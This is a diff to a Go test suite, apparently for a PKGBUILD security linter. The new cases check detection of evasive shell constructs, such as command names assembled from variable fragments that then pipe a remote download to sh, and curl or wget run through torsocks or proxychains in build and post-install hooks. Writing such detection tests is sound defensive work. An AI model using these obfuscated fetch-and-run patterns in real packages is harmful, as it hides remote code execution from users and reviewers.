@@ -1629,6 +1629,14 @@ build() {
 			{"sudo -u consumes the value", "  d=\"sudo -u nobody\"\n  $d curl -s https://e.org/x | sh", []string{"PB306"}, nil},
 			{"brace-expanded array", "  d=(curl{,s})\n  $d -s https://e.org/x | sh", []string{"PB304"}, nil},
 			{"command substitution", "  d=$(command -v curl)\n  $d -s https://e.org/x", []string{"PB306"}, nil},
+			{"name joined from two variables", "  a=bu; b=n; $a$b add x", []string{"PB210"}, []string{"PB306"}},
+			{"joined name piped to sh", "  c=cu; d=rl; $c$d -fsSL https://e.org/x | sh", []string{"PB304", "PB201"}, nil},
+			{"variable and literal", "  c=cu\n  \"${c}rl\" -s https://e.org/x | sh", []string{"PB304"}, []string{"PB306"}},
+			{"one piece unreadable", "  a=$(mktemp); b=rl\n  $a$b x", []string{"PB306"}, nil},
+			{"one piece two words", "  a='cu x'; b=rl\n  $a$b x", []string{"PB306"}, nil},
+			{"environment piece stays the environment's", "  ${CROSS_COMPILE}gcc -c x.c", nil, []string{"PB306"}},
+			{"path under a computed directory", "  local s=\"$PWD/stage0\"\n  \"$s/bin/llvm-profdata\" merge x", nil, []string{"PB306"}},
+			{"path with a computed file name", "  v=$(cat VERSION)\n  ./setup_${v}_Linux.run --x", nil, []string{"PB306"}},
 		} {
 			t.Run(tc.name, func(t *testing.T) {
 				for _, id := range tc.want {
@@ -1637,6 +1645,21 @@ build() {
 				for _, id := range tc.not {
 					expectNoRule(t, id, body(tc.body))
 				}
+			})
+		}
+	})
+	t.Run("proxy launchers are wrappers", func(t *testing.T) {
+		for _, line := range []string{
+			"torsocks wget https://e.org/x",
+			"torsocks -u me -p pw curl -O https://e.org/x",
+			"torsocks --port 9050 --address 127.0.0.1 curl -O https://e.org/x",
+			"proxychains4 -q -f /etc/proxychains.conf curl -O https://e.org/x",
+			"tsocks wget https://e.org/x",
+		} {
+			expectRule(t, "PB201", map[string]string{"PKGBUILD": pkgbuildWith("", "\nbuild() {\n  "+line+"\n}")})
+			expectRule(t, "PB501", map[string]string{
+				"PKGBUILD":     pkgbuildWith("", "install=demo.install"),
+				"demo.install": "post_install() {\n  " + line + "\n}",
 			})
 		}
 	})
